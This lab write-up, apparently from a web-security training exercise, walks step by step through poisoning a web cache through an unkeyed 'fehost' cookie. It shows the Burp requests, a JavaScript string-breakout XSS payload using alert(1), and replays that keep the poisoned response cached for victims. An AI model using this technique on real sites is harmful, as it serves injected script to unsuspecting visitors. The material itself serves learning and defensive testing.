# Web Cache Poisoning with an Unkeyed Cookie


## Lab Goal



The application is vulnerable to **Web Cache Poisoning** because cookies are not included in the cache key.



The goal is to poison the cache with a response that executes:



```javascript

alert(1)

```



## What is Web Cache Poisoning?



Web Cache Poisoning happens when an attacker can:



1. Control an input that affects the server's response.

2. The input is not included in the cache key.

3. The modified response gets cached.

4. Other users receive the poisoned response.



```text

Attacker-controlled input

          ↓

     Modified response

          ↓

      Cached response

          ↓

        Victim

          ↓

    Malicious response

```



## 1. Identify the Cookie





With Burp running, I loaded the home page and checked:



```text

Proxy → HTTP history

```



The first response set:



```http

Set-Cookie: fehost=prod-cache-01

```



After reloading the page, I noticed that the `fehost` cookie value was reflected in a JavaScript object in the response.



For example:


```javascript

data = {

    "host":"...",

    "path":"/",

    "frontend":"prod-cache-01"

}

```



This indicates that `fehost` influences the response.



## 2. Test the Cookie


I sent the request to **Burp Repeater** and added a cache-buster:



```http

GET /?cb=1234 HTTP/2


```



Then I changed the cookie to:


```http

Cookie: fehost=test

```



The response reflected the new value:




```javascript

"frontend":"test"

```



Therefore:



```text

fehost → affects the response

```



## 3. Inject an XSS Payload



Because the cookie value was reflected inside a **double-quoted JavaScript string**, I used a quote to break out of the 

string.



Payload:



```text

fehost=someString"-alert(1)-"someString

```



This causes the resulting JavaScript to execute:



```javascript

alert(1)

```



## 4. Poison the Cache



I replayed the request until the malicious value was reflected in the response and the following header appeared:



```http

X-Cache: hit

```



This confirmed that the poisoned response was being served from the cache.



The attack flow was:



```text

fehost cookie

      ↓

XSS payload

      ↓

Modified response

      ↓

Response cached

      ↓

Cache poisoned

```



## 5. Trigger the Payload



I loaded the poisoned URL in the browser.



The cached response caused:



```javascript

alert(1)

```



to execute.



## 6. Keep the Cache Poisoned



I removed the cache-buster and continued replaying the malicious request to keep the cache poisoned until the victim 
visited the page.



The lab was then solved.



## Key Takeaway



The vulnerability existed because:



```text

fehost

  ↓
affects the response

  ↓

not included in the cache key

  ↓

poisoned response gets cached

  ↓

victims receive the poisoned response

```



### Key Concepts



* **Unkeyed input:** Input that affects the response but is not part of the cache key.

* **Cache poisoning:** Storing a malicious response in the web cache.

* **Impact:** The poisoned response can be used to deliver attacks such as XSS.



### Vulnerable Input



```text

Cookie: fehost

```



### Payload



```text

someString"-alert(1)-"someString

```



### Impact



```text

Web Cache Poisoning → Stored/Reflected XSS from the cached response

```
